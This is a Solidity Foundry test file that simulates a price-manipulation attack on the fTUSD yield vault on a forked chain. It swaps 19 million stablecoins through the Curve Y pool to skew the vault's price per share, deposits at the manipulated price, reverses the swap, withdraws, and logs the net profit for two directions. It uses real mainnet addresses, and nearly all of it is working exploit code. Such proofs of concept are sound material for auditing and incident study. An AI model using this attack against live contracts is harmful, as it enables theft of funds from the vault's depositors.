// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface ICurveYPool {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external;
}

interface IHVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function balanceOf(address) external view returns (uint256);
    function getPricePerFullShare() external view returns (uint256);
    function underlyingBalanceWithInvestment() external view returns (uint256);
}

contract TestFTUSDProfit is Test {
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant TUSD = 0x0000000000085d4780B73119b644AE5ecd22b376;
    address constant CURVE = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
    address constant FTUSD = 0x7674622c63Bee7F46E86a4A5A18976693D54441b;

    /// @dev Test pump sizes for fTUSD using USDC as pump token
    /// USDC -> TUSD pump (index 1->3): takes TUSD out of pool, makes TUSD scarce
    /// But for deposit we want LOW ppfs -> we need TUSD PLENTIFUL, not scarce
    /// So: pump = DAI -> TUSD (index 0->3) adds DAI, takes TUSD
    /// Actually let's just test both directions
    function testBothDirections() public {
        // Direction 1: USDC -> TUSD (pump TUSD out of pool)
        {
            uint256 snap = vm.snapshot();
            deal(USDC, address(this), 19_000_000e6);
            deal(TUSD, address(this), 19_000_000e18);
            IERC20(USDC).approve(CURVE, type(uint256).max);
            IERC20(TUSD).approve(CURVE, type(uint256).max);
            IERC20(TUSD).approve(FTUSD, type(uint256).max);

            uint256 ppfsBefore = IHVault(FTUSD).getPricePerFullShare();

            // PUMP: USDC -> TUSD (buy TUSD, remove from pool)
            uint256 tusdBefore = IERC20(TUSD).balanceOf(address(this));
            ICurveYPool(CURVE).exchange_underlying(1, 3, 19_000_000e6, 0);
            uint256 gotTUSD = IERC20(TUSD).balanceOf(address(this)) - tusdBefore;

            uint256 ppfsAfterPump = IHVault(FTUSD).getPricePerFullShare();

            // DEPOSIT TUSD at manipulated price
            IHVault(FTUSD).deposit(gotTUSD);
            uint256 shares = IHVault(FTUSD).balanceOf(address(this));

            // DUMP: TUSD -> USDC (sell TUSD back)
            ICurveYPool(CURVE).exchange_underlying(3, 1, 19_000_000e18, 0);

            uint256 ppfsAfterDump = IHVault(FTUSD).getPricePerFullShare();

            // WITHDRAW
            IHVault(FTUSD).withdraw(shares);

            int256 tusdNet = int256(IERC20(TUSD).balanceOf(address(this))) - int256(19_000_000e18);
            int256 usdcNet = int256(IERC20(USDC).balanceOf(address(this))) - int256(19_000_000e6);

            emit log("=== Direction 1: USDC->TUSD pump, TUSD->USDC dump ===");
            emit log_named_uint("PPFS before", ppfsBefore);
            emit log_named_uint("PPFS after pump", ppfsAfterPump);
            emit log_named_uint("PPFS after dump", ppfsAfterDump);
            emit log_named_int("TUSD net", tusdNet);
            emit log_named_int("USDC net", usdcNet);
            emit log_named_int("Total net (DAI)", tusdNet + usdcNet * 1e12);

            vm.revertTo(snap);
        }

        // Direction 2: DAI -> TUSD pump
        {
            uint256 snap = vm.snapshot();
            deal(DAI, address(this), 19_000_000e18);
            deal(TUSD, address(this), 19_000_000e18);
            IERC20(DAI).approve(CURVE, type(uint256).max);
            IERC20(TUSD).approve(CURVE, type(uint256).max);
            IERC20(TUSD).approve(FTUSD, type(uint256).max);

            uint256 ppfsBefore = IHVault(FTUSD).getPricePerFullShare();

            // PUMP: DAI -> TUSD
            uint256 tusdBefore = IERC20(TUSD).balanceOf(address(this));
            ICurveYPool(CURVE).exchange_underlying(0, 3, 19_000_000e18, 0);
            uint256 gotTUSD = IERC20(TUSD).balanceOf(address(this)) - tusdBefore;

            uint256 ppfsAfterPump = IHVault(FTUSD).getPricePerFullShare();

            // DEPOSIT
            IHVault(FTUSD).deposit(gotTUSD);
            uint256 shares = IHVault(FTUSD).balanceOf(address(this));

            // DUMP: TUSD -> DAI
            ICurveYPool(CURVE).exchange_underlying(3, 0, 19_000_000e18, 0);

            uint256 ppfsAfterDump = IHVault(FTUSD).getPricePerFullShare();

            // WITHDRAW
            IHVault(FTUSD).withdraw(shares);

            int256 tusdNet = int256(IERC20(TUSD).balanceOf(address(this))) - int256(19_000_000e18);
            int256 daiNet = int256(IERC20(DAI).balanceOf(address(this))) - int256(19_000_000e18);

            emit log("=== Direction 2: DAI->TUSD pump, TUSD->DAI dump ===");
            emit log_named_uint("PPFS before", ppfsBefore);
            emit log_named_uint("PPFS after pump", ppfsAfterPump);
            emit log_named_uint("PPFS after dump", ppfsAfterDump);
            emit log_named_int("TUSD net", tusdNet);
            emit log_named_int("DAI net", daiNet);
            emit log_named_int("Total net", tusdNet + daiNet);

            vm.revertTo(snap);
        }
    }
}
